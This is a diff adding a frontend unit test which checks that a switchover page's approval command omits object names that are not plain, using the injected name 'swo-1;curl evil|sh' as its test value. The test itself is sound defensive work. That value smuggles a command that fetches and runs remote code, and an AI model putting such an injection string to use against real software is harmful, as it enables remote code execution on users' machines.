@@ -321,3 +321,17 @@ describe("switched over", () => {
     expect(screen.queryByText(/Start your consumers/)).toBeNull();
   });
 });
+
+describe("the Switchover's page", () => {
+  const LEGACY = { ...CONFIRM, name: "legacy-governed-v1", legacy: true, mode: "governed", operatorMode: "strict", ordinaryConfirmationAvailable: false };
+  it("the approval command names the plan file only when the name is a plain object name", async () => {
+    serve({ policy: LEGACY, switchover: switchover({ name: "swo-1", phase: "Pending", reason: "ApprovalNotVerified" }) });
+    renderAt("/team-a/switchovers/swo-1");
+    await screen.findByText(/--spec 'swo-1.switchover-plan.yaml'/);
+    cleanup();
+    serve({ policy: LEGACY, switchover: switchover({ name: "swo-1;curl evil|sh", phase: "Pending", reason: "ApprovalNotVerified" }) });
+    renderAt("/team-a/switchovers/swo-1");
+    await screen.findByText(/--spec <the downloaded plan>/);
+    expect(screen.queryByText(/curl evil/, { selector: "code, pre" })).toBeNull();
+  });
+});
